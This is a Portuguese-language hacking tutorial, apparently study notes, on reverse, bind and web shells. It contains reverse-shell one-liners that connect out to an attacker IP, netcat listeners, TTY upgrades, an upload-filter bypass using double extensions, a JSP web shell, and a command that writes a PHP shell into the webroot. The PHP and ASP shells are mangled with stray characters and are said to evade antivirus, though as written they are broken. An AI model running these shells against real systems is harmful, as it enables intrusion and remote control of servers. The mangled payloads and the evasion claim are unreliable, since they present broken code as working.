# Tipos de shell

Quando você entra num sistema, você pode tentar executar comandos remotamente com uma RCE, pra isso, você precisa de uma comunicação com a máquina atacada pra não precisar repetir a mesma vulnerabilidade toda hora, pra isso você precisa de um acesso a um shell confiável, como o powerShell ou o bash

Você pode se conectar usando protocolos como ssh ou WinRM (quase ninguém liga pro segundo mais releva). Mas, pra isso você precisa de credenciais de login, antes de fazer a conexão na sua máquina você teria que abrir uma brecha pra isso no sistema atacado

Outra maneira de se conectar a máquina infectada é usando shells, existem 3 tipos de shells, Web, bind e reverse shell, cada um tem uma vantagem e um método de comunicação diferente

## Reverse shell

É o tipo mais comum, é o jeito mais fácil de estabelecer conexão, ele é possível em sistemas que permitem execução de código remota, basicamente se o site tiver um terminal interativo, você pode usar ele pra colocar um script de reverse shell

### Ouvinte netcat 

primeiro você inicia um ouvinte na sua máquina usando o netcat

```Klython@root[/~]$ nc -lvnp 1234

listening on [any] 1234 ...
```

Se você recebeu uma mensagem dessa, o ouvinte está funcionando, eu sei que esse comando parece muito maluco, mas calma, ele é muito simples

| Flag   | Description                                                                             |
|--------|-----------------------------------------------------------------------------------------|
| `-l`   | Modo de escuta, ele vai esperar uma conexão do outro lado                               |
| `-v`   | É como se fosse um modo de relatório, você sabe de toda atualização                             |
| `-n`   | Disabilita conexão dns e só permite conexão com IPs, é bom pra aumentar a velocidade       |
| `-p 1234` | O número da porta que o netcat tá escutando, também vai ser a porta onde o shell vai entrar    |

Agora que você tem um ouvinte netcat, você pode iniciar a conexão reversa

Primeiro você precisa do IP do seu sistema, o comando `ip a` resolve isso, fácil né? Não vai ser fácil pra sempre

### comando do reverse shell
O comando pra iniciar o reverse shell depende do sistema operacional, a [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) tem uma lista grande de comandos que você pode usar 

Certos comandos são mais confiáveis que outros e podem ser tentados para fazer a conexão, os comandos abaixo são confiáveis pra bash no linux e powershell no windows

`bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f`


Depois disso, seu netcat vai mostrar algo parecido com isso (Se você estiver no futuro pode ser diferente):

```
Klython@root[/~]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

O reverse shell é útil quando você quer uma conexão rápida e confiável mas pode ser muito frágil. Quando o comando é interrompido, ou se a conexão for interrompida por algum motivo, você ia ter que fazer essa chatice toda denovo

## Bind shell

Nesse shell, você se conecta a porta do alvo

com um Bind Shell Command executado, ele começa a escutar em uma porta no host remoto e vincula o shell desse host a essa porta. você vai se conectar nessa porta com netcat, e ter o controle por um shell nesse sistema.

### comando bind shell

Mais uma vez o payload all the things pode te salvar, nele você tem um cardápio inteiro de comandos pra servir seu amigo na outra máquina

**Nota: você vai começar com uma conexão de escuta em qualquer porta no host remoto, com IP '0.0.0.0' para se conectar a ele de qualquer lugar.**

Agora você pode usar o netcat para obter a conexão

```
Klython@root[/~]$ nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Com isso você é diretamente colocado na sessão e pode interagir com o sistema, ao contrário do reverse, no bind shell, caso você se desconecte pode reconectar rápidamente, mas se o host remoto for reiniciado ou a conexão caia, você pode ficar de luto pelo shell


### TTY

Depois de conectar a um shell, você só consegue digitar comandos, mas não pode editar eles com as setas do teclado nem acessar o histórico de comandos com as setas de cima e baixo, pra isso, você pode atualizar seu TTY (Isso evolui tanto que nem ele sabe o que a própria sigla significa)

Tem várias formas de melhorar o TTY, você pode usar um método python em sistemas unix. você pode usar esse comando pra melhorar seu TTY:

`Klython@root[/~]$ python -c 'import pty; pty.spawn("/bin/bash")'`

Depois disso você pressiona ctrl+z pra colocar a conexão netcat em segundo plano, e usa o comando TTY

```
Klython@htb[/htb]$ stty raw -echo
Klyton@htb[/htb]$ fg
```

o comando fg trás o shell de volta ao primeiro plano e pronto, e o shell TTY começa a funcionar
## Web shell

O último tipo de shell é o web, é um script web (PHP ou ASPX) que aceita comandos em parâmetros de solicitação HTTP
### Upload de arquivos
Uploads de arquivos são comuns na internet, mas as vezes são implementados de maneira insegura (ou só preguiçosa), oferecendo um caminho aberto para execução remota de código (RCE), é como se você olhasse pro hacker e falasse "Oi, pode entrar". Um upload de arquivo sem tratamento permite injeção de scripts que se conectam de volta à máquina atacante

1. Filtragem de Extensão de Arquivo
A filtragem de extensão verifica a extensão do arquivo contra uma lista de permissões. Se a extensão não estiver na lista, o upload é rejeitado. Um desvio envolve o uso de extensões duplas, como .jpg.php. Se o filtro dividir o nome no ponto e verificar a primeira extensão, o upload pode ser aceito e o script PHP é executado no servidor, basicamente é uma camuflagem.

Quando você adiciona sistemas de upload, é recomendado que os arquivos sejam enviados para um diretório não acessível remotamente. Mas, muitas vezes, os desenvolvedores cagam pra isso e colocam no diretório mais óbvio possível (/uploads)

Caso você encontre um site com upload de arquivos, possívelmente ele é vulnerável a algum tipo de reverse-shell, o uso de um reverse shell é uma técnica comum. Um script de shell reverso PHP conecta o servidor à máquina do atacante.

### Criação de um web shell

Essa é uma alternativa caso você não tenha opção de upar uma "imagem" com web-shell
Um web shell é um script one-liner e pode ser memorizado fácil

PHP: 
`<?ph//p sy!stem($_RE+QUEST["c!m$d"]\); ?>`

**obs: as "/", "!", "+" foram usadas para burlar antivirus que poderiam detectar esse script como um backdoor**

JSP:
`<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`

ASP:

`<% ev_!al r>eque_st("c-m-d") %>`

**obs: os caracteres "_", "!", ">", "-" foram usadas para burlar antivirus que poderiam detectar esse script como um backdoor**

Você pode gravar esse script diretamente no webroot do servidor, os caminhos de webroot padrão de cada servidor são

| Servidor Web | Diretório Padrão                  |
|--------------|-----------------------------------|
| Apache       | `/var/www/html/`                  |
| Nginx        | `/usr/local/nginx/html/`          |
| IIS          | `C:\inetpub\wwwroot\`             |
| XAMPP        | `C:\xampp\htdocs\`                |

Você pode verificar cada diretório e usar o comando echo para escrever nele

`echo '<?p!h$p sys%tem($_REQ+UEST["c!m#d"]); ?>' > /var/www/html/shell.php`

**Nota: Isso é supondo que você já tem execução de código remoto com o servidor**

Depois de escrever ele, você precisa executar o shell, você pode acessar o diretório dele na web ou usar o comando curl

```
curl http://site.com/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Depois de tanto shell, você deve ter entendido que esse trecho `uid=33(www-data) gid=33(www-data) groups=33(www-data)` indica a conexão, se não volta tudo até entender

Um benefício de web shell é que ele simplesmente ignora qualquer firewall, já que não abriria uma porta mas executaria diretamente na porta que o servidor esteja rodando, outro benefício é que ele funcionaria mesmo que o host fosse reiniciado, mas nem tudo são flores, nem todo alvo tem um servidor apache rodando, o que torna esse shell inútil em algumas situações, outra desvantagem é que perto dos outros 2 esse shell não é nenhum pouco interativo, já que você precisa solicitar uma url diferente para executar comandos

#### Listener de web Shell
Um listener de reverse shell abre uma porta na rede para receber a conexão. O netcat faz isso com um comando:

`sudo nc -lvnp 3333`
Esse comando cria um listener na porta 3333. Em ambientes reais, é recomendável usar uma porta que não seja filtrada por firewalls

